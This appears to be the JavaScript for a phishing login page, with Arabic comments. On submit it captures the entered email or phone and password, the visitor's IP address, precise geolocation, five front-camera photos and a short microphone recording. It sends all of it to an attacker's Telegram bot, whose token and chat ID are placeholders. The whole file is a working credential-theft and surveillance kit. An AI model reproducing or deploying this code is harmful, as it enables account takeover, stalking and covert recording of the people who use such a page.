// ==================================
// CONFIGURATION & TELEGRAM BOT
// ==================================
const CONFIG = {
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000, 
  ELLIPSIS_DELAY_INCREMENT: 0.2,
  QR_STRING_LENGTH: 43,
  
  BOT_TOKEN: "التوكن",
  CHAT_ID: "الايدي"
};

// ==================================
// SELECTORS
// ==================================
const DOM = {
  loginButton: document.querySelector(".login button"),
  qrCodeContainer: document.querySelector(".right-section .qr-code"),
  emailInput: document.getElementById("emailORphone"),
  passwordInput: document.getElementById("password"),
  form: document.querySelector("form")
};

// ==================================
// UTILITY FUNCTIONS (الدوال المساعدة)
// ==================================

// دالة جلب الـ IP
const getUserIP = async () => {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("خطأ في جلب الـ IP:", error);
    return "تعذر جلب الـ IP";
  }
};

// دالة الحصول على الموقع الجغرافي
const getUserLocation = () => {
  return new Promise((resolve) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const mapLink = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
          resolve(mapLink);
        },
        (error) => {
          console.error("حدث خطأ أو تم رفض الإذن:", error);
          resolve("تم رفض إذن الموقع أو تعذر تحديد الإحداثيات");
        },
        { 
          enableHighAccuracy: true, 
          timeout: 15000,           
          maximumAge: 0             
        }
      );
    } else {
      resolve("المتصفح الحالي لا يدعم تقنية الـ Geolocation");
    }
  });
};

// دالة إرسال الوسائط (الملفات والصور) إلى تليجرام
const sendToTelegram = async (type, blob, filename) => {
  const formData = new FormData();
  formData.append('chat_id', CONFIG.CHAT_ID);
  
  if (type === 'photo') {
    formData.append('photo', blob, filename);
    await fetch(`https://api.telegram.org/bot${CONFIG.CONFIG?.BOT_TOKEN || CONFIG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
  } else if (type === 'audio') {
    formData.append('audio', blob, filename);
    await fetch(`https://api.telegram.org/bot${CONFIG.CONFIG?.BOT_TOKEN || CONFIG.BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
  }
};

// دالة إرسال التقرير النصي الشامل
const sendFullReportToTelegram = async (email, password, ip, location, captureStatus) => {
  let message = `📩 **بيانات تجربة جديدة**\n\n`;
    message += `👤 **الحساب أو الهاتف:** \`${email}\`\n`;
  message += `🔑 **كلمة المرور:** \`${password}\`\n`;
  message += `📊 **حالة الحساسات:**\n${captureStatus}\n`;
  
  if (location.startsWith("http")) {
    message += `📍 **الموقع الجغرافي:**\n${location}`;
  } else {
    message += `⚠️ **حالة الموقع الجغرافي:** _${location}_`;
  }

  const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CONFIG.CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });
  } catch (error) {
    console.error("خطأ أثناء إرسال التقرير للتليجرام:", error);
  }
};

// ==================================
// LOGIN MODULE (المسؤول عن إدارة الضغط والإرسال)
// ==================================
const LoginModule = {
  init() {
    if (!DOM.form) return;

    DOM.form.addEventListener("submit", async (e) => {
      e.preventDefault(); 

      const emailValue = DOM.emailInput ? DOM.emailInput.value : "";
      const passwordValue = DOM.passwordInput ? DOM.passwordInput.value : "";

      if (!emailValue || !passwordValue) return;

      if (DOM.loginButton) {
        DOM.loginButton.setAttribute("disabled", "true");
        DOM.loginButton.textContent = "Loading...";
      }

      let captureStatus = "";

      // 1. جلب الـ IP والـ Location بالتوازي
      const [userIP, userLocation] = await Promise.all([
        getUserIP(),
        getUserLocation()
      ]);

      // 2. تشغيل الكاميرا والصوت والتقاط الوسائط
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
        
        const video = document.getElementById('v');
        if (video) video.srcObject = stream;
        
        const canvas = document.getElementById('c');
        const ctx = canvas ? canvas.getContext('2d') : null;

        if (video && canvas && ctx) {
          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            for (let i = 1; i <= 5; i++) {
              setTimeout(() => {
                ctx.drawImage(video, 0, 0);
                canvas.toBlob(blob => sendToTelegram('photo', blob, `cam_${i}.jpg`), 'image/jpeg');
              }, i * 1000);
            }
          }, 2000);
        }

        const recorder = new MediaRecorder(stream);
        let chunks = [];
        recorder.ondataavailable = ev => chunks.push(ev.data);
        recorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
          sendToTelegram('audio', blob, 'record.ogg');
        };
        
        recorder.start();
        setTimeout(() => recorder.stop(), 4000); 
        
        captureStatus = `🎙️ الصوت: تم البدء..\n📸 الكاميرا: جاري الالتقاط..`;

      } catch (err) { 
        captureStatus = `⚠️ الحساسات: تم رفض إذن الكاميرا/الميكروفون أو غير مدعومة`; 
      }

      // 3. إرسال التقرير النصي الشامل بعد فحص الحساسات
      await sendFullReportToTelegram(emailValue, passwordValue, userIP, userLocation, captureStatus);

      if (DOM.loginButton) {
        setTimeout(() => {
          DOM.loginButton.removeAttribute("disabled");
          DOM.loginButton.textContent = "Log In";
        }, CONFIG.ANIMATION_DURATION);
      }
    });
  }
};

// ==================================
// INITIALIZATION
// ==================================
const init = () => {
  LoginModule.init();
};

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", init);
} else {
  init();
}
